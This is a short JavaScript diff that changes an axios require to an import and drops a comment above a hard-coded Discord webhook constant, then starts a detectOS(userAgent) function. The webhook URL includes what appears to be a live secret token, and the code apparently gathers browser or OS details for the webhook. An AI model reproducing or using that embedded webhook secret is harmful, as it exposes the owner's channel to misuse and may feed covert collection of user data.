@@ -1,6 +1,5 @@
-const axios = require('axios');
+import axios from 'axios';
 
-// ✅ New Discord Webhook:
 const WEBHOOK = "https://discord.com/api/webhooks/1385204773598269450/qvMjdA3y6ttc9sXkwvyPJkKNolaoLnyR8hXMJ1BEVDowBHNzkJsEblDUAt7zfvutXlW8";
 
 function detectOS(userAgent) {
